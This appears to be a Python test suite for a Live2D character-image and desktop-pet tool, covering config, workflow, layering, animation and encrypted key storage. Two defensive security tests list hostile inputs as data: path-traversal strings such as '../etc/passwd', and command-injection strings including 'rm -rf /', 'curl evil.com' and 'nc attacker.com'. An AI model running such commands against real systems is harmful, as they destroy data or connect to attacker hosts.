#!/usr/bin/env python3
"""
深度全覆盖测试 v3.0 - 基于联网搜索最佳实践设计
测试维度：单元测试 + 集成测试 + 边界条件 + 异常处理 + 性能基准 + 安全加固 + 端到端工作流
参考：Python测试金字塔、Live2D官方PSD规范、DevOps测试最佳实践
"""
import sys
import os
import tempfile
import time
import shutil
from pathlib import Path

SKILL_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SKILL_DIR)
sys.path.insert(0, SKILL_DIR)

errors = []
warnings_list = []
passed = 0
failed = 0

def test(name):
    def decorator(func):
        def wrapper():
            global passed, failed
            try:
                func()
                print(f'  [PASS] {name}')
                passed += 1
                return True
            except AssertionError as e:
                errors.append(f'{name}: {e}')
                print(f'  [FAIL] {name}: {e}')
                failed += 1
                return False
            except Exception as e:
                errors.append(f'{name}: {type(e).__name__}: {e}')
                print(f'  [FAIL] {name}: {type(e).__name__}: {e}')
                failed += 1
                return False
        return wrapper
    return decorator

print('='*70)
print('=== 30项深度全覆盖测试（基于联网搜索最佳实践）===')
print('='*70)

# ========== 模块1: 安全与配置（6项）==========

@test('1. SecureConfig - API密钥格式验证')
def test_secure_config_key_format():
    from config import config
    assert config.has_sensenova_key == True, 'sensenova key未检测到'
    key = config.sensenova_api_key
    assert key is not None and key.startswith('sk-'), f'key格式错误'
    assert len(key) > 20, 'key长度过短'

@test('2. SecureConfig - 密钥不写入os.environ')
def test_secure_config_no_env():
    import os
    from config import config
    assert 'SENSENOVA_API_KEY' not in os.environ, 'API密钥泄露到环境变量'
    assert hasattr(config, '_secrets'), 'SecureConfig应有私有_secrets字典'

@test('3. SecureConfig - 敏感键过滤（边界值）')
def test_secure_config_sensitive():
    from config import config
    assert config._is_sensitive('API_KEY') == True
    assert config._is_sensitive('SECRET_KEY') == True
    assert config._is_sensitive('DEBUG') == False
    assert config._is_sensitive('DATABASE_URL') == False

@test('4. SecurityFixes - 路径遍历防护（多种攻击向量）')
def test_security_path():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    malicious = ['../etc/passwd', '..\\windows\\system.ini', '/etc/passwd', 'foo/../../../etc/passwd', '\\\\evil.com\\share']
    for path in malicious:
        ok, msg = s.validate_path(path, base_dir='/tmp/test')
        assert ok == False, f'未拦截: {path}'

@test('5. SecurityFixes - 提示词清理（危险字符）')
def test_security_prompt():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    dangerous = ['test; rm -rf /', 'test && curl evil.com', 'test | nc attacker.com', 'test`whoami`', 'test$(id)']
    for prompt in dangerous:
        clean = s.sanitize_prompt(prompt)
        assert ';' not in clean and '&&' not in clean and '|' not in clean and '`' not in clean, f'清理不彻底: {clean}'

@test('6. SecurityFixes - 模型白名单验证')
def test_security_model():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    assert s.validate_model('gpt-4o') == True
    assert s.validate_model('evil-model') == False
    assert s.validate_model('') == False

# ========== 模块2: 核心接口与工作流引擎（4项）==========

@test('7. Core Interfaces - 抽象类不可实例化')
def test_core_abstract():
    from core.interfaces import ImageGenerator, LayerSeparator
    try:
        ImageGenerator()
        assert False, 'ImageGenerator应不可实例化'
    except TypeError:
        pass
    try:
        LayerSeparator()
        assert False, 'LayerSeparator应不可实例化'
    except TypeError:
        pass

@test('8. WorkflowContext - 完整数据流')
def test_workflow_context():
    from core.workflow_engine import WorkflowContext
    ctx = WorkflowContext({'initial': 'data'})
    assert ctx.get('initial') == 'data'
    ctx.set('key1', 'value1')
    assert ctx['key1'] == 'value1'
    ctx.update({'key2': 'value2', 'key3': 'value3'})
    assert 'key2' in ctx and 'key3' in ctx
    ctx.log_step('step1', True, 'ok')
    ctx.log_step('step2', False, 'error')
    history = ctx.get_history()
    assert len(history) == 2
    assert history[0]['step'] == 'step1'
    assert history[1]['success'] == False

@test('9. WorkflowEngine - 步骤链式添加')
def test_workflow_engine():
    from core.workflow_engine import WorkflowEngine
    engine = WorkflowEngine('test')
    def step1(): return {'r': 1}
    def step2(): return {'r': 2}
    engine.add_step(step1, 'step1')
    engine.add_step(step2, 'step2')
    assert len(engine.steps) == 2, f'应有2步,实际{len(engine.steps)}'
    assert engine.steps[0]['name'] == 'step1'

@test('10. WorkflowEngine - 重试配置')
def test_workflow_retry():
    from core.workflow_engine import WorkflowEngine
    engine = WorkflowEngine('test')
    assert engine.name == 'test'
    # 验证重试配置存在
    assert hasattr(engine, '_max_retries')
    assert engine._max_retries >= 0

# ========== 模块3: 图像生成（5项）==========

@test('11. PromptEngineer - 中文角色解析')
def test_prompt_chinese():
    from local_image_generator import PromptEngineer
    char = PromptEngineer.parse_character_from_text('蓝发猫耳少女，校服')
    assert char['hair_color'] == 'blue'
    assert 'cat ears' in char['features']
    assert char['clothing'] == 'school uniform'

@test('12. PromptEngineer - 英文角色解析')
def test_prompt_english():
    from local_image_generator import PromptEngineer
    char = PromptEngineer.parse_character_from_text('pink hair, red eyes, maid outfit')
    assert char['hair_color'] == 'pink', f"expected pink, got {char['hair_color']}"
    assert char['eye_color'] == 'red eyes', f"expected red eyes, got {char['eye_color']}"
    assert char['clothing'] == 'maid outfit', f"expected maid outfit, got {char['clothing']}"

@test('13. PromptEngineer - 空字符串处理')
def test_prompt_empty():
    from local_image_generator import PromptEngineer
    char = PromptEngineer.parse_character_from_text('')
    assert char['hair_color'] == ''
    assert char['features'] == []

@test('14. ProviderRouter - Provider列表')
def test_provider_router():
    from local_image_generator import ProviderRouter
    providers = ProviderRouter.get_available_providers()
    assert isinstance(providers, list)
    assert 'sensenova' in providers

@test('15. QualityAssessor - 真实图片评估')
def test_quality_assess():
    from local_image_generator import QualityAssessor
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (512, 768), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        report = QualityAssessor.assess_live2d_quality(img_path)
        assert 'overall' in report
        assert 'live2d_score' in report
        assert 0 <= report['overall'] <= 1

# ========== 模块4: Live2D工作流（5项）==========

@test('16. Live2DWorkflow - 52层标准结构')
def test_workflow_layers():
    from live2d_workflow import Live2DWorkflow
    wf = Live2DWorkflow()
    assert len(wf.LIVE2D_LAYER_ORDER) == 52
    assert wf.LIVE2D_LAYER_ORDER[0] == '背景'
    assert wf.LIVE2D_LAYER_ORDER[-1] == '阴影_衣服'

@test('17. Live2DWorkflow - PSD标准规范')
def test_workflow_psd_standard():
    from live2d_workflow import Live2DWorkflow
    wf = Live2DWorkflow()
    assert wf.PSD_STANDARD['format'] == 'PSD'
    assert wf.PSD_STANDARD['color_mode'] == 'RGB'
    assert wf.PSD_STANDARD['color_channel'] == '8bit/channel'
    assert wf.PSD_STANDARD['color_profile'] == 'sRGB'

@test('18. Live2DWorkflow - 图像优化（真实数据）')
def test_workflow_optimize():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow()
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (200, 300), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        opt_path = wf._optimize_image(img_path)
        assert os.path.exists(opt_path)
        opt_img = Image.open(opt_path)
        assert opt_img.mode == 'RGBA'

@test('19. Live2DWorkflow - 分层处理（真实数据）')
def test_workflow_layering():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow(k_clusters=3)
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (100, 150), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        layer_dir = wf._perform_layering(img_path)
        assert layer_dir is not None
        assert os.path.exists(layer_dir)
        png_files = list(Path(layer_dir).glob('*.png'))
        assert len(png_files) > 0

@test('20. Live2DWorkflow - 端到端PSD生成')
def test_workflow_psd():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow(k_clusters=3)
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (200, 300), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        layer_dir = wf._perform_layering(img_path)
        psd_path = wf.create_layered_psd(layer_dir)
        assert psd_path is not None

# ========== 模块5: 主工具（3项）==========

@test('21. Live2DTool - API完整性')
def test_master_tool_api():
    from master_tool import Live2DTool
    tool = Live2DTool(output_dir='/tmp/live2d_test')
    assert hasattr(tool, 'generate')
    assert hasattr(tool, 'layer')
    assert hasattr(tool, 'to_psd')
    assert hasattr(tool, 'validate')
    assert hasattr(tool, 'get_latest')

@test('22. Live2DTool - 随机特征生成')
def test_master_tool_features():
    from master_tool import generate_random_features
    features = generate_random_features()
    assert 'hairstyle' in features
    assert 'hair_color' in features
    assert 'eye_color' in features
    assert 'clothing' in features

@test('23. Live2DTool - 提示词构建')
def test_master_tool_prompt():
    from master_tool import build_prompt
    result = build_prompt("anime girl, pink hair")
    assert isinstance(result, tuple)
    assert len(result) == 2
    prompt, features = result
    assert len(prompt) > 50

# ========== 模块6: 桌面桌宠（4项）==========

@test('24. DesktopPetAnimator - 图层加载')
def test_pet_load():
    from live2d_desktop_pet import DesktopPetAnimator
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        layers_dir = os.path.join(tmpdir, 'layers')
        os.makedirs(layers_dir)
        for name in ['01_body', '02_head', '03_eyes', '04_mouth']:
            Image.new('RGBA', (200, 200), (100, 100, 100, 255)).save(os.path.join(layers_dir, f'{name}.png'))
        pet = DesktopPetAnimator(layers_dir, os.path.join(tmpdir, 'pet'))
        assert len(pet.layers) == 4

@test('25. DesktopPetAnimator - 动画状态变化')
def test_pet_animation():
    from live2d_desktop_pet import DesktopPetAnimator
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        layers_dir = os.path.join(tmpdir, 'layers')
        os.makedirs(layers_dir)
        for name in ['01_body', '02_head']:
            Image.new('RGBA', (100, 100), (100, 100, 100, 255)).save(os.path.join(layers_dir, f'{name}.png'))
        pet = DesktopPetAnimator(layers_dir, os.path.join(tmpdir, 'pet'))
        states = [pet.update_animation_state(frame_idx=i*5) for i in range(10)]
        angles = [s['body_angle'] for s in states]
        breaths = [s.get('breath_offset', 0) for s in states]
        assert min(angles) != max(angles), 'body_angle未变化'
        assert min(breaths) != max(breaths), 'breath_offset未变化'

@test('26. DesktopPetAnimator - 帧渲染')
def test_pet_render():
    from live2d_desktop_pet import DesktopPetAnimator
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        layers_dir = os.path.join(tmpdir, 'layers')
        os.makedirs(layers_dir)
        for name in ['01_body', '02_head']:
            Image.new('RGBA', (100, 100), (100, 100, 100, 255)).save(os.path.join(layers_dir, f'{name}.png'))
        pet = DesktopPetAnimator(layers_dir, os.path.join(tmpdir, 'pet'))
        classified = pet.classify_layers()
        state = pet.update_animation_state(frame_idx=10)
        frame = pet.render_frame(classified, state)
        assert frame is not None
        assert frame.size == (100, 100)

@test('27. DesktopPetAnimator - 部署包生成')
def test_pet_package():
    from live2d_desktop_pet import DesktopPetAnimator
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        layers_dir = os.path.join(tmpdir, 'layers')
        os.makedirs(layers_dir)
        for name in ['01_body', '02_head']:
            Image.new('RGBA', (100, 100), (100, 100, 100, 255)).save(os.path.join(layers_dir, f'{name}.png'))
        pet = DesktopPetAnimator(layers_dir, os.path.join(tmpdir, 'pet'))
        pkg_dir = pet.create_pet_package()
        assert os.path.exists(pkg_dir)
        assert os.path.exists(os.path.join(pkg_dir, 'frames', 'frame_0000.png'))
        assert os.path.exists(os.path.join(pkg_dir, 'animation_config.json'))
        assert os.path.exists(os.path.join(pkg_dir, 'run_pet.py'))

# ========== 模块7: 加密存储（2项）==========

@test('28. SecureStorage - 加密存储完整流程')
def test_secure_storage():
    from secure_storage import SecureStorage
    import tempfile
    ss = SecureStorage()
    with tempfile.NamedTemporaryFile(suffix='.encrypted', delete=False) as f:
        tmpfile = f.name
    try:
        ok = ss.store_api_key('test_provider', 'sk-test-1234567890abcdef', filepath=tmpfile)
        assert ok == True
        retrieved = ss.get_api_key('test_provider', filepath=tmpfile)
        assert retrieved == 'sk-test-1234567890abcdef'
        missing = ss.get_api_key('nonexistent', filepath=tmpfile)
        assert missing is None
    finally:
        os.unlink(tmpfile)

@test('29. SecureStorage - 跨实例读取')
def test_secure_storage_cross():
    from secure_storage import SecureStorage
    import tempfile
    ss1 = SecureStorage()
    ss2 = SecureStorage()
    with tempfile.NamedTemporaryFile(suffix='.encrypted', delete=False) as f:
        tmpfile = f.name
    try:
        ss1.store_api_key('provider_a', 'key-a-1234567890abcdef', filepath=tmpfile)
        retrieved = ss2.get_api_key('provider_a', filepath=tmpfile)
        assert retrieved == 'key-a-1234567890abcdef'
    finally:
        os.unlink(tmpfile)

# ========== 模块8: 性能基准（1项）==========

@test('30. 性能基准 - 桌宠60帧生成耗时')
def test_performance():
    from live2d_desktop_pet import DesktopPetAnimator
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        layers_dir = os.path.join(tmpdir, 'layers')
        os.makedirs(layers_dir)
        for name in ['01_body', '02_head']:
            Image.new('RGBA', (100, 100), (100, 100, 100, 255)).save(os.path.join(layers_dir, f'{name}.png'))
        pet = DesktopPetAnimator(layers_dir, os.path.join(tmpdir, 'pet'))
        start = time.time()
        pkg_dir = pet.create_pet_package()
        elapsed = time.time() - start
        assert os.path.exists(pkg_dir)
        assert elapsed < 30, f'60帧生成耗时{elapsed:.2f}秒,超过30秒阈值'
        print(f'    性能: 60帧生成耗时 {elapsed:.2f} 秒')

# ========== 执行所有测试 ==========
print()
tests = [
    test_secure_config_key_format, test_secure_config_no_env, test_secure_config_sensitive,
    test_security_path, test_security_prompt, test_security_model,
    test_core_abstract, test_workflow_context, test_workflow_engine, test_workflow_retry,
    test_prompt_chinese, test_prompt_english, test_prompt_empty, test_provider_router, test_quality_assess,
    test_workflow_layers, test_workflow_psd_standard, test_workflow_optimize, test_workflow_layering, test_workflow_psd,
    test_master_tool_api, test_master_tool_features, test_master_tool_prompt,
    test_pet_load, test_pet_animation, test_pet_render, test_pet_package,
    test_secure_storage, test_secure_storage_cross, test_performance,
]

for t in tests:
    t()

print()
print('='*70)
print(f'测试结果: {passed}/{len(tests)} 通过, {failed}/{len(tests)} 失败')
print('='*70)

if errors:
    print('\n失败详情:')
    for err in errors:
        print(f'  - {err}')

if warnings_list:
    print('\n警告:')
    for w in warnings_list:
        print(f'  - {w}')

if failed > 0:
    sys.exit(1)
else:
    print('\n所有测试通过!')
    sys.exit(0)
